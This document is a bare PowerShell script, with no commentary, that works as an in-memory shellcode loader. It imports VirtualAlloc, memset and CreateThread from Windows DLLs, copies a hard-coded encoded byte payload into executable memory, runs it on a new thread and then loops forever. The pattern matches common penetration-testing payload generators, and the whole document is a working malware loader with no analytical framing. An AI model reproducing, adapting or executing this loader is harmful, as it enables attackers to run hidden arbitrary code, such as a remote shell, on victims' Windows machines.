
$c = '[DllImport("kernel32.dll")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport("kernel32.dll")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport("msvcrt.dll")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $c -Name "Win32" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xb8,0x21,0x84,0xcf,0xa0,0xd9,0xc8,0xd9,0x74,0x24,0xf4,0x5b,0x31,0xc9,0xb1,0x47,0x31,0x43,0x13,0x03,0x43,0x13,0x83,0xeb,0xdd,0x66,0x3a,0x5c,0xf5,0xe5,0xc5,0x9d,0x05,0x8a,0x4c,0x78,0x34,0x8a,0x2b,0x08,0x66,0x3a,0x3f,0x5c,0x8a,0xb1,0x6d,0x75,0x19,0xb7,0xb9,0x7a,0xaa,0x72,0x9c,0xb5,0x2b,0x2e,0xdc,0xd4,0xaf,0x2d,0x31,0x37,0x8e,0xfd,0x44,0x36,0xd7,0xe0,0xa5,0x6a,0x80,0x6f,0x1b,0x9b,0xa5,0x3a,0xa0,0x10,0xf5,0xab,0xa0,0xc5,0x4d,0xcd,0x81,0x5b,0xc6,0x94,0x01,0x5d,0x0b,0xad,0x0b,0x45,0x48,0x88,0xc2,0xfe,0xba,0x66,0xd5,0xd6,0xf3,0x87,0x7a,0x17,0x3c,0x7a,0x82,0x5f,0xfa,0x65,0xf1,0xa9,0xf9,0x18,0x02,0x6e,0x80,0xc6,0x87,0x75,0x22,0x8c,0x30,0x52,0xd3,0x41,0xa6,0x11,0xdf,0x2e,0xac,0x7e,0xc3,0xb1,0x61,0xf5,0xff,0x3a,0x84,0xda,0x76,0x78,0xa3,0xfe,0xd3,0xda,0xca,0xa7,0xb9,0x8d,0xf3,0xb8,0x62,0x71,0x56,0xb2,0x8e,0x66,0xeb,0x99,0xc6,0x4b,0xc6,0x21,0x16,0xc4,0x51,0x51,0x24,0x4b,0xca,0xfd,0x04,0x04,0xd4,0xfa,0x6b,0x3f,0xa0,0x95,0x92,0xc0,0xd1,0xbc,0x50,0x94,0x81,0xd6,0x71,0x95,0x49,0x27,0x7e,0x40,0xe7,0x22,0xe8,0xab,0x50,0x2d,0xfc,0x43,0xa3,0x2e,0xed,0xcf,0x2a,0xc8,0x5d,0xa0,0x7c,0x45,0x1d,0x10,0x3d,0x35,0xf5,0x7a,0xb2,0x6a,0xe5,0x84,0x18,0x03,0x8f,0x6a,0xf5,0x7b,0x27,0x12,0x5c,0xf7,0xd6,0xdb,0x4a,0x7d,0xd8,0x50,0x79,0x81,0x96,0x90,0xf4,0x91,0x4e,0x51,0x43,0xcb,0xd8,0x6e,0x79,0x66,0xe4,0xfa,0x86,0x21,0xb3,0x92,0x84,0x14,0xf3,0x3c,0x76,0x73,0x88,0xf5,0xe2,0x3c,0xe6,0xf9,0xe2,0xbc,0xf6,0xaf,0x68,0xbd,0x9e,0x17,0xc9,0xee,0xbb,0x57,0xc4,0x82,0x10,0xc2,0xe7,0xf2,0xc5,0x45,0x80,0xf8,0x30,0xa1,0x0f,0x02,0x17,0x33,0x73,0xd5,0x51,0x41,0x9d,0xe5;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$x=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($x.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$x,0,0,0);for (;;){Start-sleep 60};

